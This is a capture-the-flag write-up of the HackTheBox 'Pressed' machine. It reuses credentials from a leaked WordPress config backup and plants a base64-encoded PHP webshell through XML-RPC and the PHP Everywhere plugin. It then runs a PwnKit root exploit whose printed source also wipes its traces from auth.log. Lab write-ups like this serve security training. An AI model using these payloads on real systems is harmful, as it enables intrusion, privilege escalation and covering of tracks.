---
title: "HTB - Pressed (Hard | Linux | Web)"
date: 2026-10-06 12:00:00 +0000
categories: [HackTheBox, Web]
tags: [htb, linux, wordpress, wpscan, xml-rpc, php-everywhere, webshell, cve-2021-4034, pwnkit]
description: "WordPress recon with wpscan, XML-RPC abuse and the php-everywhere plugin to plant a webshell, then PwnKit (CVE-2021-4034) for root"
image:
  path: /assets/img/pressed.png
---


## Recon

```bash
nmap -p- -sSCV --open --min-rate 5000 <target>
```

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: UHC Jan Finals &#8211; New Month, New Boxes
|_http-generator: WordPress 5.9
```

### Service Discovery Analysis

Only port 80 is open — an Apache server on Ubuntu running **WordPress 5.9**. With no other services exposed (no SSH, no database port directly reachable), the entire attack surface is the WordPress installation itself: its core, installed plugins/themes, and any custom functionality the site adds. WordPress 5.9 is not the latest release at the time of this box, so both core CVEs and third-party plugin vulnerabilities are worth checking once we enumerate what's installed.

---

## User

Looking at the HTTP server, we see it's a website about the UHC championship.

![](/assets/img/pressed/Pasted_image_20261008011934.png)

The source code of the page contains a link including wp-content, indicating that the target is running WordPress.

![](/assets/img/pressed/Pasted_image_20261008012002.png)

Hence, we start enumerating using wpscan.

```bash
wpscan --url http://pressed.htb --enumerate cb,u,ap
```

![](/assets/img/pressed/Pasted_image_20261008012458.png)

It appears XML-RPC is enabled, and a backup of the wp-config.php is also available at /wp-config.php.bak. Let's enumerate the backup.

```bash
curl http://pressed.htb/wp-config.php.bak > wp-config.php
```

The wp-config.php.bak file contains database credentials. We find admin:uhc-jan-finals-2021.

![](/assets/img/pressed/Pasted_image_20261008012645.png)

The recovered credentials can be used to attempt to log in as admin at /wp-login.php.

![](/assets/img/pressed/Pasted_image_20261008012800.png)

Unfortunately, login is unsuccessful. The password uhc-jan-finals-2021 we discovered ends with 2021, but the machine was released in 2022. So another logical attempt would be adjusting the password to uhc-jan-finals-2022, and we try to log in again.

![](/assets/img/pressed/Pasted_image_20261008012834.png)

### XML-RPC Abuse

**Overview**

`xmlrpc.php` is WordPress's legacy remote procedure call interface, originally built so external clients (mobile apps, other blogging tools) could publish posts, manage comments, and more without using the standard web UI. It exposes a large set of callable methods over a single endpoint and, critically, is **not protected by any 2FA or rate-limiting by default** — any valid credentials (or even some methods with none at all) can be used to call arbitrary exposed methods directly, including custom ones registered by plugins or the theme. This makes it a favorite target once valid credentials are recovered, since it bypasses the normal login flow and any UI-level protections entirely.

### Manual RPC Calls

I'll start with the `listMethods` using the payload from the [documentation](https://codex.wordpress.org/XML-RPC/system.listMethods) and `curl`:

```bash
curl --data "<methodCall><methodName>system.listMethods</methodName><params></params></methodCall>" http://pressed.htb/xmlrpc.php
```

![](/assets/img/pressed/Pasted_image_20261008014721.png)

Right away, one jumps out as interesting, `htb.get_flag` — a custom method registered specifically for this box, clearly not part of stock WordPress. I'll try that one:

```bash
curl --data "<methodCall><methodName>htb.get_flag</methodName><params></params></methodCall>" http://pressed.htb/xmlrpc.php
```

![](/assets/img/pressed/Pasted_image_20261008014747.png)

That's actually the user flag!

To interact with the RPC in a more suitable manner, the wordpress_xmlrpc module should be used in Python, providing a proper client for communication.

```bash
pip install python-wordpress-xmlrpc --break-system-packages
```

As the XML-RPC interface is not protected by 2FA, the credentials can be used to log in and retrieve the post previously observed

```python
>>> from wordpress_xmlrpc import Client
... from wordpress_xmlrpc.methods import posts
... client = Client('http://pressed.htb/xmlrpc.php', 'admin', 'uhc-jan-finals-2022')
... plist = client.call(posts.GetPosts())
... plist
```

![](/assets/img/pressed/Pasted_image_20261008013714.png)

The contents of the post previously observed can now be retrieved using the XML-RPC interface.

```python
>>> print(plist.content)
```

![](/assets/img/pressed/Pasted_image_20261008013752.png)

There is a base64-encoded string that's hardcoded to the page, so naturally we decode it.

```bash
echo -n JTNDJTNGcGhwJTIwJTIwZWNobyhmaWxlX2dldF9jb250ZW50cygnJTJGdmFyJTJGd3d3JTJGaHRtbCUyRm91dHB1dC5sb2cnKSklM0IlMjAlM0YlM0U=|base64 -d| python3 -c "import sys; from urllib.parse import unquote; print(unquote(sys.stdin.read().strip()));"
```

![](/assets/img/pressed/Pasted_image_20261008013926.png)

The post is reading a file and including it within the page via the **PHP Everywhere** plugin, which lets a post embed and execute raw PHP code. By editing this file through RPC calls, we can embed a web shell into the page. First, we will base64-encode a PHP code snippet that allows us to execute system commands once uploaded.

Then, we replace the current base64-encoded string.

```python
>>> mod_post = plist[0]
>>> mod_post.content = '<!-- wp:paragraph -->\n<p>The UHC January Finals are underway!  After this event, there are only three left until the season one finals in which all the previous winners will compete in the Tournament of Champions. This event a total of eight players qualified, seven of which are from Brazil and there is one lone Canadian.  Metrics for this event can be found below.</p>\n<!-- /wp:paragraph -->\n\n<!-- wp:php-everywhere-block/php {"code":"JTNDP3BocCUyMCUwQSUyMCUyMGVjaG8oZmlsZV9nZXRfY29udGVudHMoJy92YXIvd3d3L2h0bWwvb3V0cHV0LmxvZycpKTslMjAlMEElMjAlMjBpZiUyMCgkX1NFUlZFUiU1QidSRU1PVEVfQUREUiclNUQlMjA9PSUyMCcxMC4xMC4xNi42NScpJTIwJTdCJTBBJTIwJTIwJTIwJTIwc3lzdGVtKCRfUkVRVUVTVCU1QidjbWQnJTVEKTslMEElMjAlMjAlN0QlMjAlMEE/JTNF","version":"3.0.0"} /-->\n\n<!-- wp:paragraph -->\n<p></p>\n<!-- /wp:paragraph -->\n\n<!-- wp:paragraph -->\n<p></p>\n<!-- /wp:paragraph -->'
>>> client.call(posts.EditPost(mod_post.id, mod_post))
```

![](/assets/img/pressed/Pasted_image_20261008025407.png)

Once the post is edited, we can execute commands as follows in our browser:

![](/assets/img/pressed/Pasted_image_20261008025527.png)

---

## Root

Attempting to get a reverse shell will fail, as outbound traffic is blocked on this box — no callback connection can leave the machine. Therefore, the machine must be enumerated entirely through the web shell we planted, using `?cmd=` one-liners instead of an interactive shell.

The PwnKit vulnerability (CVE-2021-4034), described in the Qualys blog, was a notable CVE released alongside the machine. It exploits the /usr/bin/pkexec binary. By examining the timestamp of the binary, we can see that it was last edited in 2021.

### CVE-2021-4034 (PwnKit)

**Overview**

PwnKit is a memory-corruption vulnerability in `pkexec`, the Polkit component that lets authorized users run commands as another user (similar to `sudo`). The flaw lies in how `pkexec` handles its argument count: when called with zero arguments, it miscalculates its environment variable array, allowing an attacker to inject a crafted `GCONV_PATH` environment variable that points to a malicious shared library. Because `pkexec` is a SUID-root binary, it loads and executes that attacker-controlled library's `gconv_init()` function **as root**, with no authentication required at all — any local user can go from unprivileged to root in one shot. It's one of the most impactful and widely-exploited Linux local privilege escalation bugs of recent years, since Polkit is installed by default on practically every major distro.

```url
http://pressed.htb/index.php/2022/01/28/hello-world/?cmd=ls%20-la%20/usr/bin/pkexec
```

![](/assets/img/pressed/Pasted_image_20261008025610.png)

And since the CVE was found after that, we can come to the conclusion that this machine is vulnerable to PwnKit. We can use the available POC for the PwnKit vulnerability and leverage the pkexec binary for privilege escalation. We will first download the poc and then we edit the script pkwner.sh to add the cat /root/root.txt command in place of /bin/bash in order to get the root flag.

```bash
git clone https://github.com/kimusan/pkwner.git
bash pkwner.sh
cat > pkwner/pkwner.c <<- EOM
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
void gconv() {}
void gconv_init() {
 printf("hello");
 setuid(0); setgid(0);
 seteuid(0); setegid(0);
 system("PATH=/bin:/usr/bin:/usr/sbin:/usr/local/bin/:/usr/local/sbin;"
"rm -rf 'GCONV_PATH=.' 'pkwner';"
"cat /var/log/auth.log|grep -v pkwner >/tmp/al;cat /tmp/al >/var/log/auth.log;"
"cat /root/root.txt");
exit(0);
}
EOM
```

Since outbound traffic is blocked, the XML-RPC interface must be used to upload the script to the machine — we reuse the same WordPress media-upload method that got us the web shell, this time to deliver the compiled PwnKit PoC itself.

```python
python
>>> from wordpress_xmlrpc import Client 
>>> from wordpress_xmlrpc.methods import posts
>>> client = Client('http://pressed.htb/xmlrpc.php', 'admin', 'uhc-jan-finals-2022')
>>> plist = client.call(posts.GetPost(1))
>>> from wordpress_xmlrpc.methods import media
>>> with open('pkwner.sh', 'r') as f:
>>>     script = f.read()
>>> data = { 'name': 'pkwner.png', 'bits': script, 'type': 'text/plain' }
>>> client.call(media.UploadFile(data))
```

![](/assets/img/pressed/Pasted_image_20261008032423.png)

```python
http://pressed.htb/index.php/2022/01/28/hello-world/?cmd=bash%20/var/www/html/wp-content/uploads/2026/10/pkwner-4.png
```

![](/assets/img/pressed/Pasted_image_20261008032440.png)

Running the uploaded script through the web shell triggers the PwnKit exploit, which executes as root and dumps the contents of root.txt directly in the command output — full root compromise achieved entirely through the web shell, without ever needing an interactive or reverse connection.

---

### Summary

**Attack Chain:**

1. **WordPress Fingerprinting** → Identified WordPress 5.9 via page source (`wp-content` references)
2. **WPScan Enumeration** → Found XML-RPC enabled and a `.bak` backup of `wp-config.php` exposed
3. **Config Backup Disclosure** → Downloaded `wp-config.php.bak`, recovered database/admin credentials (`admin:uhc-jan-finals-2021`)
4. **Password Pattern Guessing** → Login failed with the 2021-suffixed password; adjusted to match the box's 2022 release year (`uhc-jan-finals-2022`), succeeded
5. **XML-RPC Method Enumeration** → Listed available RPC methods, found a custom `htb.get_flag` method that directly returned the user flag
6. **Authenticated XML-RPC Access** → Used `python-wordpress-xmlrpc` to log in and read existing post content, revealing a base64-encoded PHP Everywhere block reading a log file
7. **PHP Everywhere Abuse** → Edited the post via XML-RPC to replace the embedded PHP Everywhere code with a web shell (`system($_REQUEST['cmd'])` restricted to our IP), achieving RCE through the rendered page
8. **Outbound Traffic Blocked** → Reverse shell attempts failed; pivoted to working entirely through the `?cmd=` web shell
9. **PwnKit Discovery** → Confirmed the `pkexec` binary's timestamp predated the CVE-2021-4034 patch
10. **CVE-2021-4034 Exploitation** → Compiled a PwnKit PoC locally, delivered it to the target via XML-RPC media upload (disguised as a `.png`), executed it through the web shell
11. **Root Access** → PwnKit executed as root, dumping root.txt directly in the web shell's output

